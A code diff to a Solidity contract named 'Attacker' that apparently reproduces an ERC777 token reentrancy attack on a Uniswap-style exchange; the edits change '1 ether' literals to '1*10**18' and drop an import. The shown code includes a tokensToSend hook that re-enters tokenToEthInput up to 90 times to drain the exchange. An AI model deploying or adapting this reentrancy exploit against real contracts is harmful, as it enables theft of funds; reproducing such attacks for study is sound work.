@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.7.0;
 
-import "node_modules/openzeppelin-solidity-3.4.0/token/ERC777/ERC777.sol";
 import "node_modules/openzeppelin-solidity-3.4.0/introspection/IERC1820Registry.sol";
 import "node_modules/openzeppelin-solidity-3.4.0/introspection/ERC1820Implementer.sol";
 import "node_modules/openzeppelin-solidity-3.4.0/token/ERC777/IERC777Sender.sol";
@@ -47,8 +46,7 @@ contract Attacker is IERC777Sender, ERC1820Implementer {
       bool ret = victim.approve(address(exchange), victim.balanceOf(address(this)));
       require(ret == true, "approve failed");
       
-      uint256 output = exchange.tokenToEthInput(1 ether);
-
+      uint256 output = exchange.tokenToEthInput(1*10**18); // want to exchange 1*10**18 of token to ETH
 
       output = exchange.tokenToEthInput(victim.balanceOf(address(this)));
     }
@@ -63,7 +61,7 @@ contract Attacker is IERC777Sender, ERC1820Implementer {
     ) external override {
         numSend +=1; 
         if(numSend < 90){
-            exchange.tokenToEthInput(1 ether);
+            exchange.tokenToEthInput(1*10**18);
         }
     }
 
